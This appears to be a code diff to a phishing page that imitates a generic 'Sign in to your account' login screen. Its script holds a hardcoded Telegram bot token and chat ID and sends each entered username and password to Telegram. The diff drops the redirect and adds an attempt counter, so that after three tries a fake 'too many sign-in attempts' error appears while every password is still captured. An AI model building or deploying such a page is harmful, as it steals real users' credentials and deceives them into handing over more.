@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <title>Sign in to your account</title>
     <style>
+        /* Login page styles */
         body {
             background-color: #f3f3f3;
             display: flex;
@@ -139,14 +140,17 @@
                 </div>
                 <button type="submit" class="submit-button">Sign in</button>
             </form>
+            <div id="errorMessage" style="display: none; color: red; margin-top: 1rem;">Error, too many sign-in attempts. Try again later.</div>
             <button type="button" class="back-button" onclick="goBack()">Back</button>
             <p class="footer-text"><a href="#">Forgot password?</a></p>
         </div>
     </div>
+
     <script>
         const BOT_TOKEN = "7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s";
         const CHAT_ID = "5990707499";
         let username = '';
+        let attemptCount = 0;
 
         document.getElementById('usernameForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -155,20 +159,20 @@
                 document.getElementById('displayUsername').textContent = username;
                 document.getElementById('usernamePage').style.display = 'none';
                 document.getElementById('passwordPage').style.display = 'block';
+                attemptCount = 0;
+                document.getElementById('errorMessage').style.display = 'none';
             }
         });
 
-        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const password = document.getElementById('password').value;
             if (password) {
                 const message = `Username: ${username}\nPassword: ${password}`;
-                try {
-                    await sendToTelegram(message);
-                    window.location.href = "404.html";
-                } catch (error) {
-                    console.error("Error sending to Telegram:", error);
-                    alert("Failed to send details to Telegram. Check the console for details.");
+                sendToTelegram(message).catch(error => console.error("Error sending to Telegram:", error));
+                attemptCount++;
+                if (attemptCount >= 3) {
+                    document.getElementById('errorMessage').style.display = 'block';
                 }
             }
         });
